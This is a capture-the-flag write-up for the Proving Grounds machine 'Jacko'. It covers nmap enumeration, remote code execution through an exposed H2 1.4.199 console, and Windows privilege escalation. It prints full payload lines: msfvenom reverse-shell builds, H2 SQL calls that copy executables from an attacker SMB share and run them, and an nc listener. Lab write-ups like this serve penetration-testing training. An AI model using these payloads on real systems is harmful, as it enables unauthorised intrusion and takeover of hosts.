---
layout: default
title: x003-Jacko
nav_order: 2
has_children: false
parent: ProvingGrounds
grand_parent: Writeups
---

## x003-Jacko
### Enumeration
#### NMAP 
```sh
nmap -A -T4 192.168.95.66 -p-
```
Resulting in : 
```
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
7680/tcp open  pando-pub?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2022-02-20T15:20:34
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```

#### Web

Accessing directly the IP on our browser we notice that a webserver is running and that an H2 Database might be present on the server.

The console web server is also exposed on port 8082 (from the NMAP scan) and the default user allow us to access the console. 

We notice the version of the H2 running : 1.4.199

### Access
After a research on searchsploit we found an exploit for RCE : 

```bash
searchsploit H2 1.4.199
```

![](attachments/Pasted%20image%2020220220163503.png)

After executing all the step in the exploit we get the expected result, the console give us the RCE : 
![](attachments/Pasted%20image%2020220220163601.png)

The payload must be updated in order to obtain a reverse shell.
The payload was created with msfvenom : 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.218 LPORT=80 -f exe -o reverse.exe
```
It was served using the samba server inside impacket : 
```bash
python3 /opt/impacket/examples/smbserver.py -smb2support Share .  
```

Then we can download it on our target :
```java
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.218\\Share\\reverse.exe c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

And run it : 
```java
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```


Once login in order to get access to the command we have to fix our PATH : 
```sql
set PATH=%PATH%;C:\Windows\System32;C:\Program Files
```

![](attachments/Pasted%20image%2020220220221531.png)

### Privilege Escalation

After executing winpeas, nothing suspicious was found. 

But after listing the software installed in order to check for potential privilege escalation, one software look possible to exploit : 
![](attachments/Pasted%20image%2020220301231633.png)
```sh
searchsploit PaperStream IP
```

![](attachments/Pasted%20image%2020220301230844.png)

Inside the exploit we have extra indication to generate the needed dll : 
```sh
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.49.218 LPORT=445
```

We expose our file using our Python SMB share and we use the following payload to download it : 
```java
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.218\\Share\\shell.dll c:\\users\\tony\\shell.dll").getInputStream()).useDelimiter("\\Z").next()');
```

We update or exploit before downloading it :
```powershell
$PayloadFile = "C:\Users\tony\shell.dll"
```

Then :
```java
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.218\\Share\\privesc.ps1 c:\\users\\tony\\privesc.ps1").getInputStream()).useDelimiter("\\Z").next()');
```

We wait for the privileged reverse shell : 
```sh
nc -lnvp 445
```


The reverse shell didn't show, we get back to common PrivEsc like PrintSpoofer : 

![](attachments/Pasted%20image%2020220301234220.png)

```java
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.218\\Share\\PrintSpoofer64.exe c:\\users\\tony\\PrintSpoofer64.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Then we execute the exe and here we are : 
![](attachments/Pasted%20image%2020220301234528.png)

And we could retrieve the flag : 
![](attachments/Pasted%20image%2020220301234625.png)
